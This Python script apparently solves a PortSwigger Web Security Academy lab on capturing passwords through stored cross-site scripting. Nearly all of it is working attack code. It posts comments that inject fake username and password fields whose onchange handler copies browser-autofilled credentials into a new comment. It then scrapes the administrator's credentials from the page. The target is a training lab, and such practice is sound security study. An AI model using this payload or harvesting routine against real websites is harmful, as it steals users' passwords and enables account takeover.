# P https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
import requests
import sys
from bs4 import BeautifulSoup
import re
import time
site = 'ac6b1f221fad95e2c051677300c70063.web-security-academy.net'
s = requests.Session()

post_url = f'https://{site}/post?postId=2'
resp = s.get(post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')
comment_url = f'https://{site}/post/comment'

comment_xss = '''<input name=username id=username>
<input type=password name=password>'''
print(f'''Inject form fields via <input> tags to show the XSS injected via {comment_xss}''')

comment_data = {
    'csrf' : csrf,
    'postId' : '2',
    'comment' : comment_xss,
    'name' : 'Wu',
    'email' : 'wu@pdx.edu',
    'website': 'https://pdx.edu'
}

resp = s.post(comment_url, data=comment_data)
input(f'Visit {post_url} to view the input fields created via injection of {comment_xss}')

print(f'Password manager autofill causes the onchange attribute to fire')
print(f'Use event to execute code to submit a comment with autofilled data')

post_url = f'https://{site}/post?postId=4'
comment_xss = ''''<input name=username id=username>
<input type=password name=password onchange="document.forms[0].email.value='wu@foo.com';document.forms[0].name.value='a';document.forms[0].comment.value=username.value+':'+this.value;document.forms[0].website='https://foo.com';document.forms[0].submit();">'''

input(f'Sending {post_url}, the payload {comment_xss}')
comment_data = {
    'csrf' : csrf,
    'postId' : '4',
    'comment' : comment_xss,
    'name' : 'Wu',
    'email' : 'wu@pdx.edu',
    'website': 'https://pdx.edu'
}
resp = s.post(comment_url, data=comment_data)

# Get page and parse out credentials.  Then use it to access main page
resp = s.get(post_url)
soup = BeautifulSoup(resp.text,'html.parser')
credentials = soup.find('p', text=re.compile('administrator')).text.split(':')
print(credentials)